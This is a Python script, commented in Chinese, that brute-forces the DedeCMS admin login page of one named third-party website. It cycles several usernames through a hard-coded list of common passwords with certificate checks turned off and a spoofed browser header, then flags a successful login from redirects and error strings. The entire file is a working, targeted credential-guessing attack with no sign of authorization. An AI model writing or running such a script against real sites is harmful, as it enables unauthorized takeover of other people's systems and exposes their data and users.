#!/usr/bin/env python3
"""bf_compare_v2.py - compared4u.net 标准DedeCMS登录接口爆破
POST /dede/login.php: dopost=login&userid=admin&pwd=xxx (标准DedeCMS字段)
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'https://www.compared4u.net'
LOGIN = BASE + '/dede/login.php'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "dedecms", "compared4u", "compare123", "123456789",
             "1qaz2wsx", "qwe123", "admin!@#", "adminadmin", "compare4u",
             "c4u123", "root", "test123"]

def main():
    for user in ['admin', 'root', 'dedecms', 'administrator']:
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                             urllib.request.HTTPSHandler(context=ctx))
        try:
            opener.open(urllib.request.Request(LOGIN, headers=UA), timeout=10).read()
        except Exception:
            pass
        for pw in PASSWORDS:
            # 标准DedeCMS: userid/pwd/dopost=login
            data = urllib.parse.urlencode({'dopost': 'login', 'userid': user, 'pwd': pw,
                                           'gotopage': '/dede/index.php', 'validate': ''}).encode()
            try:
                req = urllib.request.Request(LOGIN, data=data,
                                             headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                                      'Referer': LOGIN})
                resp = opener.open(req, timeout=10)
                b = resp.read(20000).decode('utf-8', 'ignore')
                fu = resp.geturl()
                st = resp.status
            except urllib.error.HTTPError as e:
                st, b, fu = e.code, e.read(20000).decode('utf-8', 'ignore'), e.geturl()
            except Exception as e:
                print('err %s/%s: %s' % (user, pw, repr(e)[:60]), flush=True)
                continue
            # 302跳转非login=成功
            if st == 302 and 'login' not in fu.lower():
                print('!!! HIT: %s/%s -> %s' % (user, pw, fu), flush=True)
                sys.exit(0)
            if 'index.php' in fu and 'login' not in fu:
                print('!!! HIT: %s/%s -> %s' % (user, pw, fu), flush=True)
                sys.exit(0)
            # 失败标志
            if '密码' in b or '错误' in b or '失败' in b or '不正确' in b or '验证码' in b:
                if pw == PASSWORDS[0]:
                    print('  %s: err resp: %s' % (user, b[:120].replace(chr(10), ' ')), flush=True)
                time.sleep(0.2)
                continue
            # 其他=可能成功
            if len(b) > 800 and 'userPass' not in b and 'btnLogin' not in b:
                print('!!! CHECK %s/%s st=%d fu=%s' % (user, pw, st, fu), flush=True)
                sys.exit(0)
        print('user %s done' % user, flush=True)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
